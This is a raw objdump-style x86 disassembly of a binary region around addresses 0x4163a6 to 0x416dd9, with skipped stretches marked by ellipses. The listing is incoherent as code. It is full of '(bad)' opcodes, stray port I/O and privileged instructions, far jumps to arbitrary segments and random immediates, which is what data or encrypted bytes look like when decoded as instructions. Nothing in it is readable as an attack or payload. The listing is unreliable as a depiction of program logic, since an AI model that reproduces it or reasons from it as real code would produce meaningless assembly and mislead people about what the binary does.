  4163a6:	in     eax,0x2d
  4163a8:	rcl    cl,1
  4163aa:	repz jne 0x416400
  4163ad:	dec    esi
  4163ae:	adc    ebx,ebp
  4163b0:	stos   BYTE PTR es:[edi],al
  4163b1:	sbb    eax,0xddda0046
  4163b6:	xor    esi,DWORD PTR [ebx]
  4163b8:	xor    DWORD PTR [eax+edx*1],esp
  4163bb:	jmp    0x416366
  4163bd:	cdq    
  4163be:	lea    ebx,[edx-0x7d]
  4163c1:	push   esp
  4163c2:	retf   0x1e32
  4163c5:	jno    0x416373
  4163c7:	sub    eax,0x38f88f26
  4163cc:	mov    ecx,0x554ea2a3
  4163d1:	repz pushf 
  4163d3:	jmp    0x416449
  4163d5:	lea    esi,[si+0x756e]
  4163da:	mov    BYTE PTR [ecx-0x33c51f46],dl
  4163e0:	cmp    ebp,DWORD PTR [edx-0x1e]
  4163e3:	cdq    
  4163e4:	and    eax,0xb3812f5d
  4163e9:	(bad)  
  4163ea:	in     al,dx
  4163eb:	pop    es
  4163ec:	call   0x64d91ae0
  4163f1:	pop    esp
  4163f2:	rep outs dx,BYTE PTR ds:[esi]
  4163f4:	inc    edi
  4163f5:	sub    BYTE PTR [ebx+eiz*4],ah
  4163f8:	xchg   ebx,eax
  4163f9:	mov    esi,0x3c33195a
  4163fe:	sub    BYTE PTR [edi],bl
  416400:	sub    BYTE PTR [edx+edx*1-0x7b028465],0x30
  416408:	jo     0x4163fc
  41640a:	test   eax,0x4598ebec
  41640f:	out    0x0,al
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	std    
  416481:	(bad)  
  416482:	adc    DWORD PTR ss:[eax-0x15],eax
  416486:	add    BYTE PTR [eax],al
  416488:	add    al,0x1
  41648a:	add    BYTE PTR [eax],al
  41648c:	int    0x97
  41648e:	and    ah,BYTE PTR [ebx+eax*4]
  416491:	ret    
  416492:	iret   
  416493:	stos   BYTE PTR es:[edi],al
  416494:	cmp    DWORD PTR [edi],0xffffff91
  416497:	jp     0x4164bf
  416499:	leave  
  41649a:	jns    0x4164d2
  41649c:	fcomp  QWORD PTR [ebp-0x1682c11]
  4164a2:	cli    
  4164a3:	jo     0x4164df
  4164a5:	gs leave 
  4164a7:	outs   dx,BYTE PTR ds:[esi]
  4164a8:	adc    eax,0x26bbf354
  4164ad:	test   DWORD PTR [edi],edx
  4164af:	(bad)  
  4164b0:	out    dx,eax
  4164b1:	fstp   st(4)
  4164b3:	jo     0x41644b
  4164b5:	fimul  DWORD PTR [ebx]
  4164b7:	test   eax,0x967d6dd3
  4164bc:	sub    al,0xd8
  4164be:	in     al,dx
  4164bf:	clc    
  4164c0:	(bad)  
  4164c1:	jge    0x41651c
  4164c3:	pushf  
  4164c4:	pop    ecx
  4164c5:	push   ebp
  4164c6:	iret   
  4164c7:	sub    dh,BYTE PTR [ebp+0x2c7fee48]
  4164cd:	lods   eax,DWORD PTR es:[esi]
  4164cf:	in     eax,dx
  4164d0:	popa   
  4164d1:	nop
  4164d2:	pop    ebx
  4164d3:	(bad)  
  4164d5:	out    0x72,al
  4164d7:	imul   esp,DWORD PTR [eax-0x5452654c],0x5c
  4164de:	pop    edx
  4164df:	dec    edx
  4164e0:	stc    
  4164e1:	cmc    
  4164e2:	js     0x4164ff
  4164e4:	xchg   ecx,eax
  4164e5:	mov    eax,DWORD PTR [edi]
  4164e7:	bound  esi,QWORD PTR ds:[esi+0x14]
  4164eb:	fcomp  DWORD PTR [eax+0x18]
  4164ee:	pop    eax
  4164ef:	xchg   ebx,eax
  4164f0:	pop    eax
  4164f1:	test   al,0xab
  4164f3:	pusha  
  4164f4:	jg     0x416506
  4164f6:	and    DWORD PTR [edx-0x5ee06ea],esp
  4164fc:	jmp    0x416499
  4164fe:	repz sub esi,DWORD PTR [ebx-0x63c04f68]
  416505:	sub    ch,dl
  416507:	ins    DWORD PTR es:[edi],dx
  416508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416509:	std    
  41650a:	add    cl,al
  41650c:	pop    ecx
  41650d:	jg     0x41652c
  41650f:	ins    BYTE PTR es:[edi],dx
  416510:	mov    bl,BYTE PTR [edx+0x4824cb05]
  416516:	das    
  416517:	push   0x77df1e85
  41651c:	repz stc 
  41651e:	loopne 0x416523
  416520:	xor    al,0x73
  416522:	push   cs
  416523:	adc    dl,BYTE PTR [eax-0x7c063df8]
  416529:	loopne 0x416564
  41652b:	stc    
  41652c:	mov    edx,0x69baad9e
  416531:	mov    DWORD PTR [ebx+0x48edcd2a],edx
  416537:	ficomp WORD PTR [esi]
  416539:	sub    DWORD PTR [ebx+0x2d],edx
  41653c:	pop    es
  41653d:	sbb    DWORD PTR ds:0x8cfe1d42,ecx
  416543:	test   DWORD PTR [edi],ecx
  416545:	xor    dh,BYTE PTR [esi]
  416547:	add    DWORD PTR [ecx-0x2f],ebp
  41654a:	adc    BYTE PTR [edi],bl
  41654c:	pop    ebx
  41654d:	add    si,WORD PTR [eax+ebx*1-0x60]
  416552:	aaa    
  416553:	xor    cl,BYTE PTR [eax]
  416555:	jg     0x41652b
  416557:	loope  0x4165a0
  416559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41655a:	dec    ebx
  41655b:	imul   ebx,DWORD PTR [eax+0x15d6b990],0xffffffec
  416562:	xchg   DWORD PTR [edx],edi
  416564:	adc    esi,DWORD PTR [edi-0x4c]
  416567:	pop    eax
  416568:	lea    esi,[esi]
  41656a:	mov    DWORD PTR [edx-0x42caf44d],esp
  416570:	aas    
  416571:	cmp    ebx,DWORD PTR [edx+edx*1]
  416574:	push   ds
  416575:	sub    al,0xcb
  416577:	js     0x41656c
  416579:	jmp    0x4165be
  41657b:	inc    eax
  41657c:	cwde   
  41657d:	mov    ch,0xe0
  41657f:	jmp    0x4165f9
  416581:	(bad)  
  416582:	cmp    BYTE PTR [edi-0x90d503f],dl
  416588:	sub    edx,DWORD PTR [edi+0x0]
  41658b:	aad    0xa0
  41658d:	push   ss
  41658e:	lds    ecx,FWORD PTR [ecx]
	...
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x4b04354]
  416601:	add    ah,BYTE PTR [esi+0xec4463]
  416607:	add    BYTE PTR [ecx+eax*1],al
  41660a:	add    BYTE PTR [eax],al
  41660c:	std    
  41660d:	and    al,0xc5
  41660f:	rcl    bl,0xe0
  416612:	lods   al,BYTE PTR ds:[esi]
  416613:	inc    esp
  416614:	mov    cl,0xa7
  416616:	test   al,0x2d
  416618:	cmc    
  416619:	outs   dx,BYTE PTR ds:[esi]
  41661a:	dec    edx
  41661b:	add    eax,0xe757a2bf
  416620:	cs jge 0x416605
  416623:	jmp    0x9da1:0x9b6d5d48
  41662a:	sbb    al,0x41
  41662c:	das    
  41662d:	xor    al,0x3a
  41662f:	push   0x44
  416631:	scas   al,BYTE PTR es:[edi]
  416632:	jmp    0x4165ed
  416634:	and    al,0x54
  416636:	and    DWORD PTR [eax-0x28d89346],esi
  41663c:	bound  edi,QWORD PTR [esi+0x14]
  41663f:	dec    DWORD PTR [ebx+0x78]
  416642:	out    0x2c,eax
  416644:	pop    edi
  416645:	xor    BYTE PTR [ebp-0x3feeaac1],cl
  41664b:	popa   
  41664c:	and    cl,dh
  41664e:	bound  esp,QWORD PTR ds:0x71873ba9
  416654:	add    BYTE PTR [edi+edi*1-0x5fcdd057],0x4d
  41665c:	rol    ah,0x46
  41665f:	fld1   
  416661:	call   0x11364a1a
  416666:	and    eax,0xc1e19baa
  41666b:	jge    0x41669c
  41666d:	fs adc eax,0x293e200d
  416673:	mov    DWORD PTR [ebx+0x5],ebx
  416676:	push   ss
  416677:	sbb    BYTE PTR [edi-0x5d],bh
  41667a:	xor    dh,0x95
  41667d:	out    0x29,al
  41667f:	or     al,dh
  416681:	mov    cl,0x77
  416683:	pop    es
  416684:	cmp    BYTE PTR [ebx],dl
  416686:	arpl   WORD PTR [edx],dx
  416688:	sbb    DWORD PTR [ebx-0x30],edx
  41668b:	and    eax,0x267e149e
  416690:	push   ebx
  416691:	and    eax,0xd6e85d64
  416696:	push   cs
  416697:	jmp    0x41669c
  416699:	retf   0x9bce
  41669c:	push   ecx
  41669d:	mov    cl,0x6
  41669f:	cmp    al,0xdc
  4166a1:	pop    es
  4166a2:	inc    esi
  4166a3:	aaa    
  4166a4:	cwde   
  4166a5:	scas   eax,DWORD PTR es:[edi]
  4166a6:	sahf   
  4166a7:	(bad)  
  4166a8:	push   ecx
  4166a9:	repnz int 0xf8
  4166ac:	js     0x416641
  4166ae:	dec    ebx
  4166af:	cdq    
  4166b0:	test   BYTE PTR [esi],ah
  4166b2:	sbb    eax,0x594d8770
  4166b7:	push   0x2123c376
  4166bc:	aaa    
  4166bd:	aaa    
  4166be:	mov    edi,0x7a8bfe2
  4166c3:	or     al,0x4f
  4166c5:	das    
  4166c6:	rcr    DWORD PTR [edi-0x2b],1
  4166c9:	repz test BYTE PTR [edx-0x1754e4fd],bh
  4166d0:	mov    cs,WORD PTR [eax-0x7c4816e1]
  4166d6:	stos   DWORD PTR es:[edi],eax
  4166d7:	mov    bh,0x87
  4166d9:	mov    cl,0xeb
  4166db:	or     eax,0xca010caf
  4166e0:	dec    ecx
  4166e1:	jmp    0x1188:0x6c353013
  4166e8:	add    eax,0xc4d809ed
  4166ed:	shr    DWORD PTR [edi-0x75],1
  4166f0:	ret    
  4166f1:	cs sub al,al
  4166f4:	shl    ch,cl
  4166f6:	fidiv  WORD PTR [ebx+0x5e]
  4166f9:	test   al,0x12
  4166fb:	or     esi,ebx
  4166fd:	aaa    
  4166fe:	jp     0x4166cd
  416700:	jge    0x41671f
  416702:	das    
  416703:	mov    eax,ds:0xf261be2a
  416708:	mov    ecx,0xa999fa96
  41670d:	push   esi
  41670e:	push   ds
  41670f:	test   eax,0x0
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	nop
  416781:	stc    
  416782:	mov    ah,0xe1
  416784:	dec    eax
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	iret   
  41678d:	outs   dx,DWORD PTR ds:[esi]
  41678e:	and    al,0x9a
  416790:	mov    ds:0xecafbe8e,eax
  416795:	xor    ch,0xc2
  416798:	jmp    0x416755
  41679a:	test   eax,0x7b5da5a7
  41679f:	and    eax,0x5c9b2eb6
  4167a4:	inc    esi
  4167a5:	pushf  
  4167a6:	push   ecx
  4167a7:	in     eax,0x49
  4167a9:	add    al,dl
  4167ab:	addr16 xor ebx,edx
  4167ae:	or     al,0x32
  4167b0:	nop
  4167b1:	and    al,0x46
  4167b3:	(bad)  
  4167b4:	mov    bh,0xe5
  4167b6:	push   ebp
  4167b7:	imul   cx,WORD PTR [ecx*1+0x695990fb],0xf
  4167c0:	mov    ebx,0x80314b48
  4167c5:	jmp    0x41676c
  4167c7:	les    esi,FWORD PTR [ebp+0x7cfb7e8b]
  4167cd:	xor    DWORD PTR [edi],0xffffff84
  4167d0:	mov    ebx,0xf7f51d48
  4167d5:	outs   dx,BYTE PTR ds:[esi]
  4167d6:	shr    ah,0xbb
  4167d9:	jg     0x416848
  4167db:	lds    esi,FWORD PTR [ecx-0x7]
  4167de:	icebp  
  4167df:	jae    0x41679b
  4167e1:	pop    es
  4167e2:	or     esi,DWORD PTR [eax]
  4167e4:	test   al,0xe2
  4167e6:	mov    ecx,esi
  4167e8:	daa    
  4167e9:	test   edx,edi
  4167eb:	sbb    al,0x99
  4167ed:	pop    edx
  4167ee:	fcom   DWORD PTR [ebx-0x5c]
  4167f1:	dec    ebx
  4167f2:	adc    eax,0x6bcae245
  4167f7:	sub    ecx,DWORD PTR [ebx]
  4167f9:	nop
  4167fa:	shl    bh,1
  4167fc:	fwait
  4167fd:	xchg   ebx,eax
  4167fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167ff:	jmp    0x4167b6
  416801:	cmp    al,0xd8
  416803:	out    dx,eax
  416804:	push   esi
  416805:	test   eax,0x43fe4ad2
  41680a:	ficom  WORD PTR [edi+0x3bb7feeb]
  416810:	aad    0x60
  416812:	xchg   ebx,eax
  416813:	pop    ebx
  416814:	aam    0xfd
  416816:	xor    BYTE PTR [ebx-0x687c3ddd],bl
  41681c:	loope  0x4167ce
  41681e:	es dec ecx
  416820:	fimul  WORD PTR [ebx+eiz*2-0x67]
  416824:	mov    eax,0xf413df29
  416829:	(bad)  [edx+0x1d6ab0fb]
  41682f:	out    0x2f,eax
  416831:	cmp    eax,0xb647de52
  416836:	xchg   edx,eax
  416837:	loop   0x416882
  416839:	dec    esi
  41683a:	and    bl,bl
  41683c:	(bad)  
  41683d:	sti    
  41683e:	js     0x4167c8
  416840:	xlat   BYTE PTR ds:[ebx]
  416841:	mov    bh,0x4d
  416843:	mov    edi,0x8999190e
  416848:	add    DWORD PTR [esi+0x29],esp
  41684b:	mov    ?,WORD PTR [edx-0x22]
  41684e:	stos   BYTE PTR es:[edi],al
  41684f:	push   ebx
  416850:	stos   BYTE PTR es:[edi],al
  416851:	xor    ah,ch
  416853:	or     dl,ch
  416855:	push   edi
  416856:	sbb    eax,DWORD PTR [ebx-0x6f]
  416859:	cli    
  41685a:	in     al,dx
  41685b:	mov    ds:0x2f4beced,eax
  416860:	mov    ds:0x881674a,al
  416865:	out    0x22,al
  416867:	aad    0x47
  416869:	test   DWORD PTR [edx+edx*8],esp
  41686c:	or     esp,edx
  41686e:	inc    eax
  41686f:	pop    es
  416870:	(bad)  
  416871:	pop    ebp
  416872:	int    0x21
  416874:	push   ebp
  416875:	(bad)  
  416876:	cmc    
  416877:	jmp    0x39f8:0x66a739a4
  41687e:	sar    DWORD PTR [ebp-0x22],0x9c
  416882:	dec    esp
  416883:	xlat   BYTE PTR ds:[ebx]
  416884:	jae    0x416842
  416886:	sbb    ebp,ebp
  416888:	imul   edx,DWORD PTR [edx+0x27],0x2b
  41688c:	pop    ds
  41688d:	pop    ss
  41688e:	lahf   
  41688f:	adc    DWORD PTR [eax],eax
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xea923cf7
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	sbb    BYTE PTR [edi+0x4821a442],cl
  416912:	leave  
  416913:	(bad)  
  416914:	aam    0x27
  416916:	mov    WORD PTR [ecx],ss
  416918:	and    dl,BYTE PTR [edi-0x3c59281e]
  41691e:	pop    ebx
  41691f:	dec    ecx
  416920:	cdq    
  416921:	imul   edi,DWORD PTR [edx-0x53],0x6f439542
  416928:	add    cl,BYTE PTR [edi+0x4c]
  41692b:	jp     0x4168ef
  41692d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41692e:	pop    ecx
  41692f:	jnp    0x41699d
  416931:	jp     0x416973
  416933:	jae    0x41695d
  416935:	push   cs
  416936:	test   al,0x4c
  416938:	mov    al,ds:0xc77f6401
  41693d:	dec    esi
  41693e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693f:	inc    edx
  416940:	mov    ecx,DWORD PTR [edi-0x29845019]
  416946:	push   esi
  416947:	js     0x41695d
  416949:	mov    ds:0x2ab8c737,eax
  41694e:	rcr    DWORD PTR [eax+0x55884631],cl
  416954:	xchg   esi,eax
  416955:	lahf   
  416956:	sbb    BYTE PTR [eax],dh
  416958:	cmp    esp,DWORD PTR [eax+0x233f1c12]
  41695e:	and    ah,ah
  416960:	js     0x4168e8
  416962:	xchg   ebp,eax
  416963:	or     eax,esp
  416965:	fisttp DWORD PTR [edx]
  416967:	mov    ah,BYTE PTR [ebx-0x6d]
  41696a:	in     al,0xc6
  41696c:	pop    edi
  41696d:	mov    gs,WORD PTR [ecx+0x12]
  416970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416971:	inc    ebp
  416972:	(bad)  
  416973:	fcmovnu st,st(3)
  416975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416976:	(bad)  
  416977:	mov    ah,0x8f
  416979:	mov    BYTE PTR [esi+0x6201e23c],dl
  41697f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416980:	(bad)
  416983:	ror    BYTE PTR [edx-0x7a],0x27
  416987:	mov    ah,0x98
  416989:	lea    ebp,[edi]
  41698b:	add    al,0x63
  41698d:	xchg   edx,eax
  41698e:	(bad)  
  416990:	repz std 
  416992:	(bad)  
  416993:	test   DWORD PTR [ebp-0x43],0x908322e9
  41699a:	out    dx,al
  41699b:	sbb    al,0x50
  41699d:	dec    ebp
  41699e:	lahf   
  41699f:	ds std 
  4169a1:	mov    ds:0x38a2349,eax
  4169a6:	xchg   ebp,eax
  4169a7:	inc    eax
  4169a8:	add    bh,bl
  4169aa:	rol    ebx,0x1e
  4169ad:	sbb    DWORD PTR [edx+0x50],esp
  4169b0:	push   ecx
  4169b1:	test   dh,al
  4169b3:	or     DWORD PTR ds:0x93238966,edi
  4169b9:	jbe    0x4169fa
  4169bb:	xor    eax,0x7827e26
  4169c0:	dec    edi
  4169c1:	ror    DWORD PTR [edx+edx*1],1
  4169c4:	fiadd  DWORD PTR [eax]
  4169c6:	mov    dl,0x14
  4169c8:	jne    0x416a32
  4169ca:	jmp    0xd9415451
  4169cf:	jno    0x4169a3
  4169d1:	(bad)  
  4169d3:	je     0x416974
  4169d5:	cmp    BYTE PTR [ecx+0x3798ff97],0xbf
  4169dc:	add    edx,DWORD PTR [edi+0x4d2d5874]
  4169e2:	in     al,0xe4
  4169e4:	call   0x7a6c7aff
  4169e9:	mov    edx,0xf2eff52c
  4169ee:	xchg   esi,eax
  4169ef:	sbb    ecx,edi
  4169f1:	aam    0x44
  4169f3:	lods   al,BYTE PTR ds:[esi]
  4169f4:	std    
  4169f5:	cld    
  4169f6:	and    eax,0xe53a7310
  4169fb:	add    dl,BYTE PTR [ecx+ebp*2-0x2171df70]
  416a02:	daa    
  416a03:	add    cl,BYTE PTR [ecx]
  416a05:	adc    al,0xe
  416a07:	mov    eax,ds:0x764fb9eb
  416a0c:	sahf   
  416a0d:	ror    edi,cl
  416a0f:	dec    esp
	...
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x28970ba3
  416a82:	loopne 0x416ae5
  416a84:	push   eax
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	add    BYTE PTR [ebp+0x12],dh
  416a8f:	js     0x416a28
  416a91:	sbb    al,0xd
  416a93:	jg     0x416a56
  416a95:	in     eax,dx
  416a96:	outs   dx,DWORD PTR ds:[esi]
  416a97:	push   ebp
  416a98:	frstor [esp+ecx*8]
  416a9b:	jae    0x416af0
  416a9d:	call   0x7fe3:0x9080bc2a
  416aa4:	xor    ecx,DWORD PTR [eax+0x3c]
  416aa7:	repnz hlt 
  416aa9:	rcl    BYTE PTR [ebx],0xb0
  416aac:	fisttp WORD PTR [eax+0x5c]
  416aaf:	xor    edx,DWORD PTR [edx]
  416ab1:	lock and DWORD PTR [eiz*8+0x557422c9],0xffffffad
  416aba:	aad    0x58
  416abc:	js     0x416b2b
  416abe:	xchg   BYTE PTR [esi],al
  416ac0:	(bad)  
  416ac1:	imul   esp,eax,0x2d
  416ac4:	add    al,0xd1
  416ac6:	mov    cl,0x59
  416ac8:	mov    esi,0xd3b35901
  416acd:	test   DWORD PTR [edi-0x43],eax
  416ad0:	cmp    edi,ecx
  416ad2:	outs   dx,DWORD PTR ds:[esi]
  416ad3:	aaa    
  416ad4:	adc    ebx,DWORD PTR [ecx-0x23]
  416ad7:	mov    dl,0xfd
  416ad9:	popa   
  416ada:	mov    WORD PTR [ebx],ss
  416adc:	dec    esp
  416add:	(bad)  
  416ade:	jb     0x416a63
  416ae0:	xchg   ebx,eax
  416ae1:	push   ecx
  416ae2:	rol    DWORD PTR [ecx+0x5e6d42b7],1
  416ae8:	out    0x4c,al
  416aea:	mov    BYTE PTR [edi],0x15
  416aed:	add    BYTE PTR [eax+0x6d],ah
  416af0:	mov    ecx,0x2cfcb4d8
  416af5:	dec    edx
  416af6:	ret    
  416af7:	inc    edx
  416af8:	push   0x78
  416afa:	outs   dx,BYTE PTR ds:[esi]
  416afb:	mov    dl,0x1b
  416afd:	sbb    bl,BYTE PTR [esi-0x1d665959]
  416b03:	je     0x416b71
  416b05:	mov    ds:0xe5e73b6b,al
  416b0a:	pusha  
  416b0b:	std    
  416b0c:	out    0xef,al
  416b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b0f:	(bad)  
  416b11:	das    
  416b12:	int3   
  416b13:	sar    cl,0xa6
  416b16:	sub    eax,0xb48205f
  416b1b:	daa    
  416b1c:	mov    edi,0x6d67352
  416b21:	int    0xa7
  416b23:	push   es
  416b24:	jp     0x416b0c
  416b26:	cs cmc 
  416b28:	or     eax,0xb01e880f
  416b2d:	and    eax,0xab2eb633
  416b32:	sar    DWORD PTR [eax-0x66ead98e],1
  416b38:	or     DWORD PTR [ebp+ebx*4-0x4b],0x86b671be
  416b40:	jnp    0x416b66
  416b42:	retf   
  416b43:	(bad)  
  416b45:	pop    es
  416b46:	cmp    edi,DWORD PTR [edx]
  416b48:	fwait
  416b49:	xchg   edi,eax
  416b4a:	icebp  
  416b4b:	push   cs
  416b4c:	xchg   ebp,eax
  416b4d:	out    0xfa,al
  416b4f:	loopne 0x416b85
  416b51:	pop    ebp
  416b52:	pushf  
  416b53:	mov    dl,0x9d
  416b55:	ds hlt 
  416b57:	sbb    dl,BYTE PTR [ebx]
  416b59:	jnp    0x416bac
  416b5b:	daa    
  416b5c:	outs   dx,DWORD PTR ds:[esi]
  416b5d:	xchg   al,ah
  416b5f:	rcl    dl,1
  416b61:	mov    bl,0x7d
  416b63:	cs in  al,0x54
  416b66:	sub    dl,ah
  416b68:	xlat   BYTE PTR es:[ebx]
  416b6a:	aad    0xe9
  416b6c:	or     ebx,eax
  416b6e:	sub    DWORD PTR fs:[ebx+0x59d72616],eax
  416b75:	mov    edx,0xf69c7f39
  416b7a:	mov    ebp,0x2fcc2b6d
  416b7f:	scas   al,BYTE PTR es:[edi]
  416b80:	add    eax,0x69a5a06
  416b85:	jl     0x416b96
  416b87:	inc    edx
  416b88:	mov    bl,al
  416b8a:	cmp    edi,esi
  416b8c:	out    0xbe,al
  416b8e:	stos   DWORD PTR es:[edi],eax
  416b8f:	mov    DWORD PTR [eax],0x0
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x2e5b70a9
  416c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c02:	daa    
  416c03:	ret    0xf054
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	sub    bl,0xad
  416c0f:	data16 fwait
  416c11:	and    eax,0x78118b39
  416c16:	lods   eax,DWORD PTR ds:[esi]
  416c17:	call   0x83a7ad16
  416c1c:	xlat   BYTE PTR ds:[ebx]
  416c1d:	add    BYTE PTR [ecx],0xce
  416c20:	jle    0x416c75
  416c22:	adc    al,0xd7
  416c24:	sbb    edi,ecx
  416c26:	scas   eax,DWORD PTR es:[edi]
  416c27:	imul   DWORD PTR [ebx-0x17]
  416c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c2b:	add    eax,0x43ab87cf
  416c30:	aaa    
  416c31:	mov    eax,ds:0xa789e4e2
  416c36:	pop    esi
  416c37:	ja     0x416bff
  416c39:	xchg   edi,eax
  416c3a:	fdiv   st(3),st
  416c3c:	jle    0x416c76
  416c3e:	and    bl,BYTE PTR [esi-0x1c94d7fe]
  416c44:	sub    eax,0x2c0c4a8b
  416c49:	fcom   DWORD PTR [esi+0x58c7736f]
  416c4f:	sbb    dh,BYTE PTR [edx+0x4aa9bb3e]
  416c55:	stos   DWORD PTR es:[edi],eax
  416c56:	push   ecx
  416c57:	ret    0x7cbc
  416c5a:	ja     0x416c09
  416c5c:	mov    BYTE PTR [edx-0x7d],0xc0
  416c60:	imul   eax,ebp,0xffffff8b
  416c63:	cmp    al,0xf7
  416c65:	es xchg edi,eax
  416c67:	push   edi
  416c68:	sar    DWORD PTR [edx+0x9965b8b],cl
  416c6e:	jbe    0x416c2c
  416c70:	sub    ch,dh
  416c72:	scas   al,BYTE PTR es:[edi]
  416c73:	fisubr WORD PTR [ebx-0x7f]
  416c76:	adc    ebp,DWORD PTR [esi+eax*1-0x26]
  416c7a:	test   al,0x26
  416c7c:	sub    DWORD PTR [ebp-0x340944b4],esp
  416c82:	fidiv  WORD PTR [edx-0x38c2a55c]
  416c88:	or     BYTE PTR [ebp+0x308bb128],al
  416c8e:	add    BYTE PTR [eax-0x25f30165],dh
  416c94:	sbb    eax,0x3d88a3f8
  416c99:	mov    edx,DWORD PTR [ebx-0x73]
  416c9c:	fld    TBYTE PTR [edx+0x6d1f6847]
  416ca2:	(bad)  
  416ca3:	add    edi,ecx
  416ca5:	inc    ebx
  416ca6:	push   es
  416ca7:	sbb    ebx,edx
  416ca9:	xor    eax,0xd623e4dd
  416cae:	pop    esp
  416caf:	out    0x24,al
  416cb1:	mov    ah,0x54
  416cb3:	pop    ebp
  416cb4:	not    DWORD PTR [edx]
  416cb6:	(bad)  [ecx-0x110551c1]
  416cbc:	stos   DWORD PTR es:[edi],eax
  416cbd:	xchg   BYTE PTR [edi+0x61],bh
  416cc0:	sbb    dh,dl
  416cc2:	mov    esp,0x5c7a3fce
  416cc7:	repz int 0x4c
  416cca:	lahf   
  416ccb:	jbe    0x416ca2
  416ccd:	cli    
  416cce:	pop    edx
  416ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cd0:	inc    edx
  416cd1:	xlat   BYTE PTR ds:[ebx]
  416cd2:	sbb    DWORD PTR [ecx+0x34df6046],eax
  416cd8:	pop    edx
  416cd9:	mov    ebx,0xc2fb27bc
  416cde:	loopne 0x416ca0
  416ce0:	out    dx,al
  416ce1:	out    0x8b,eax
  416ce3:	jp     0x416d42
  416ce5:	outs   dx,BYTE PTR ds:[esi]
  416ce6:	ins    BYTE PTR es:[edi],dx
  416ce7:	pushf  
  416ce8:	push   cs
  416ce9:	sbb    BYTE PTR [ebp+0x54],0x83
  416ced:	stos   BYTE PTR es:[edi],al
  416cee:	or     BYTE PTR [ebx-0x7a14df3c],0x19
  416cf5:	stos   DWORD PTR es:[edi],eax
  416cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cf7:	sub    al,0xf3
  416cf9:	int3   
  416cfa:	dec    edi
  416cfb:	mov    ah,0x4c
  416cfd:	mov    dl,0x48
  416cff:	js     0x416c8f
  416d01:	hlt    
  416d02:	rcl    edx,0xb4
  416d05:	rol    bl,1
  416d07:	adc    edx,edi
  416d09:	mov    dh,BYTE PTR [ebp+0x5be4de05]
  416d0f:	sub    al,0x0
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	lahf   
  416d81:	les    eax,FWORD PTR [edx+eax*1+0x58]
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	ins    DWORD PTR es:[edi],dx
  416d8d:	push   esi
  416d8e:	mov    ds,WORD PTR [ebp+0x14f514d3]
  416d94:	repnz aad 0x50
  416d97:	(bad)  
  416d98:	ret    
  416d99:	jo     0x416e04
  416d9b:	dec    edi
  416d9c:	cdq    
  416d9d:	jno    0x416e07
  416d9f:	ins    DWORD PTR es:[edi],dx
  416da0:	sbb    al,0x8f
  416da2:	cld    
  416da3:	jbe    0x416d79
  416da5:	sahf   
  416da6:	je     0x416de0
  416da8:	cli    
  416da9:	push   ss
  416daa:	dec    esi
  416dab:	ins    BYTE PTR es:[edi],dx
  416dac:	ja     0x416d6b
  416dae:	retf   0x5176
  416db1:	xchg   esi,eax
  416db2:	ror    esi,0x17
  416db5:	loope  0x416ded
  416db7:	xor    ecx,ebx
  416db9:	lahf   
  416dba:	sub    DWORD PTR [ebp+eax*1-0x4ed4e7e7],ebx
  416dc1:	push   esi
  416dc2:	xchg   ecx,eax
  416dc3:	inc    edi
  416dc4:	arpl   WORD PTR [ecx+0x72],cx
  416dc7:	mov    ah,0xa7
  416dc9:	xchg   esi,eax
  416dca:	stc    
  416dcb:	add    eax,0x8deaa9a5
  416dd0:	ss dec edi
  416dd2:	push   eax
  416dd3:	shl    DWORD PTR [esi-0x49c68dc9],cl
  416dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
